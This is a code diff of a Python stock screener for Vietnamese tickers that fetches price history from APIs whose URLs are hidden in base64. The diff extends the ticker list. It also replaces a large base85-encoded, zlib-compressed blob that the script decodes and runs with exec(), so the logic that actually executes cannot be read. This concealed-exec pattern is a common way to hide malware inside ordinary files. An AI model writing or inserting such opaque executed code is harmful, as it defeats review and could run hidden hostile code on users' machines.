@@ -5,7 +5,7 @@ _h = lambda s: base64.b64decode(s).decode()
 _S1 = _h("aHR0cHM6Ly9kY2hhcnQtYXBpLnZuZGlyZWN0LmNvbS52bi9kY2hhcnQvaGlzdG9yeQ==")
 _S2 = _h("aHR0cHM6Ly9hcGlwdWJhd3MudGNicy5jb20udm4vc3RvY2staW5zaWdodC92Mi9zdG9jay9iYXJzLWxvbmctdGVybQ==")
 
-U = sorted(set("ACB BCM BID BMP BSR BVH BWE CII CMG CTD CTG CTR CTS DBC DCM DGC DGW DHC DIG DPM DXG DXS EIB EVF FPT FRT FTS GAS GEX GMD GVR HAG HCM HDB HDC HDG HHV HPG HSG HT1 IMP KBC KDC KDH KOS LPB MBB MSB MSN MWG NAB NKG NLG NT2 NVL OCB PAN PC1 PDR PHR PLX PNJ POW PTB PVD PVT REE SAB SBT SCS SHB SIP SJS SSB SSI STB SZC TCB TCH TPB VCB VCG VCI VDS VGC VHC VHM VIB VIC VIX VJC VND VNM VPB VPI VRE VSC VTP HAH ANV DPG ELC MSR ACV VGI QNS OIL VEA FOX PVS SHS CEO IDC L14 TNG HUT VCS PVC DTD".split()))
+U = sorted(set("ACB BCM BID BMP BSR BVH BWE CII CMG CTD CTG CTR CTS DBC DCM DGC DGW DHC DIG DPM DXG DXS EIB EVF FPT FRT FTS GAS GEX GMD GVR HAG HCM HDB HDC HDG HHV HPG HSG HT1 IMP KBC KDC KDH KOS LPB MBB MSB MSN MWG NAB NKG NLG NT2 NVL OCB PAN PC1 PDR PHR PLX PNJ POW PTB PVD PVT REE SAB SBT SCS SHB SIP SJS SSB SSI STB SZC TCB TCH TPB VCB VCG VCI VDS VGC VHC VHM VIB VIC VIX VJC VND VNM VPB VPI VRE VSC VTP HAH ANV DPG ELC MSR ACV VGI QNS OIL VEA FOX PVS SHS CEO IDC L14 TNG HUT VCS PVC DTD BAF DNH NTP NVB PAP PET VGR VPL PGS MSH".split()))
 UA = {"User-Agent": "Mozilla/5.0"}
 def get(url):
     with urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=20) as r: return json.load(r)
@@ -23,16 +23,19 @@ def bars(sym, days=400):
     return None
 def _q(c, n): return c[-1]/c[-n-1]-1 if len(c) > n else None
 _B = (
-    "c-nPT&2G~`5WeRrMyV>T)BNl@IBEhx;*8(`;uKkx<80!U?X|mhO8W?$P{o-;RU`zW5+Ed`^yrHBFi*nlu9H$hE!m#^JU`#gd~21x"
-    "E?^2XzqQO16d)wLnzR6~Il}Wm6{K*?S}Z|kCBo>Ja7pGf<~#5R*pN;j%w#F#nj6ou3t<;dbi7%g1c^&=RjgAI&V=7N!3XGiLf2D)"
-    "TyfHKX&0#D3|!h_l+pp?V}Ly<>+7Fzb6#J+ldC}<iR!ZivJ%w=l+~4tU|w&&$rZ>|RDF?KN6T0ZyP!sRkMU+MGB`RW$ZRxpx{b-)"
-    "(XD+r-r26_+8i-P(f)&u8o~h@Zbyw8gQ&6YiGCKQGtV>0fhPsWqR!3<>uN9k`j4Bb5eY1k2B+AZ9u}VX4SgI<Kge?~7i1yAk`&Vd"
-    "JDX$$pQ>z)DEc!W$s+9qYcLBAbSl5c9NkOnp@xlz8d{KPaI^(SJJ1yW=fWLqU75S}y?1Nc>cUcGX(a9vi^PtVCV<*#z8jTTFrLQu"
-    "uqg6C#nYLMIMo|7Iy%)l!u%sT@qNd(uM{co7YXM%q5YxLGVLrfRg##WO_Ly<F9J{#P_uU2#+FMQg4VV6bIfTF*dLvk%XP|CP;&dt"
-    "gye0%85%<`LuWkh5OKhqfkXz0IM&BX8G0s*jy3(7wQ;K${&)(E`mH^98r9ctIh0Yoxhf~{;w6MZh5|Aw53BDIR`uqi755vIyyrr>"
-    "HVFCs<^%Kgwc1LhPsXz+9>oR2WYq;8i#V!&;A<u7&1DM5YfR|v14*)ab0HwDF1OVra(HhYVl+P?@aro^-kb+IzPdbfS_{5}qd3a2"
-    "503pugt$lCkC{r_e+a2}d(L|v4#R-~c+|?7mun@ry~E8PQV8Ti16C&%?J>{5MlBl9IW=JQgZZ?yT_1W{e;sTgHDO+>%yL~EC(IY*"
-    "@6PL4h+FD-V(u!S*GOPC(ev1aVLlvnKhJW4pPkkpIem@G"
+    "c-n<k&2Hm15Wedv1}XxOUdfj1)<u-no>~++Y!4e0L1731EzvgD5~WadVx#D($367{3hbVW9tyNTPn%<kzK7qWLsFKV-TnxOOno!_"
+    "IGp)rqU!q=QkZ34!547DD@O7FBuzZPhoNaaBJx>GFM#7mK8rGIS=0))AS5Djk|oy223vRrBn}xJaO<VG-Y5y&k+;>7<Q?<Yl7(@0"
+    ">K6?^9mG*IAluO)l5s@Cm?CX7oP21T{)a7g8$A<eYvTOIojb>K=S;PvrS@AaK-L;z^eed}^I4oxcn<L-N+7SL7INe6q60wQJG0+@"
+    "-?4HW;a9t<NInzU;0|9lFT$Lsm|Suaj-vn~N=M_!L>P@?e(r8O2|!KpFCHVu&8@x9ga+L*9#8xA__MK#btTZXVp}{eL@>!5tgwVb"
+    ")-+req!76#ZQ5e2W!>^r)f+@@qLBzGi@3uaI5JcjCdx$TJk+G~P!k8n2Am$iX%E`NKYH*&2iJIf@HJ^RHx;eT_Sd!Kz{{4~RR9ZB"
+    "S1a)}u$AbeG67(=JG;%h1J`M%seg&3ZJ1i8Gq-PRu6L^2a2h39MqLuMsQ9ogId2H6iFy)KZS-K0OTACv)fEC)`-fk0sP^yQ$rUWc"
+    "<2xW%FTbLoSG<P&@ejGgrS-WMUog!s;C8b^CBUCQiv7b66+|Ik$hqqkGw$`{TWL4F0j>V}ZU68SqWS*eXV!55Deyf~?ajRy&V|Iv"
+    "?%)5~fL!5^27LdHJLK~5?T&g{?Gm`Y#86i<uM3_J%bFF$e@fxgnU8t%Gmmd`-e~yJ{)k$3o4@<s%UNm00#P%6?W1<CFK4)HeN33m"
+    "p|Tn`!^4!;S`2c1nRy79%pn7X7dStnuH(&|X=|l<L73%WsBl{f^t^!GiG6PEHv#r#XSWn~iZo>1&5*8t*YG?=cAQMfVUX<F!<_1U"
+    "URWPg)~VBB{+Q=A9xwS;6Y*ga$AP`jwxw3cNP~@zd~4coUf^c34$<@)Iq8THv&?$HjF<T6evH6aae^%dWM?;YP}lHvWq7fA-0HJm"
+    "Y;-Q`dtzo^kC|7&OU=lt-l#VHoYG;d)xzM!Kl?U3tHQIw?=rbT(fprEhD)xAFPCiRQ%F-2PCxtm`X{FP4OZWcCd^eOB(Z(#`tGP4"
+    "lRSGclf@IwxLJUeb!wydcm_(2^UVl@tobf2Sv4;hD0{AP?n4rRi;Bxl#TBN-HSfm(y135I2SngMwvoisN^xuCuKrQmIB|Si@EAp<"
+    ">*lD_(+!5g`8Uq{Ji@+t8Zrr;Ie_qR)mdU#dlsa}fQL=p5VTY8Z;&rH`v"
 )
 exec(zlib.decompress(base64.b85decode(_B)).decode())
 for r in top: r.pop("val", None)
